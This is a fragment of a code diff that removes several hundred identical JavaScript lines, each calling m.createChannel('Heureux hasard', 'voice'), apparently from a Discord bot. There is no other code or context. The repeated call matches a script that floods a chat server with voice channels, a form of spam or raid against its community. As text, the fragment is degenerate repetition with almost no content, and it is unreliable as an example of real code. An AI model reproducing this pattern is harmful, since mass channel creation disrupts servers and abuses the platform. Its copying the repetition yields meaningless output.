-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
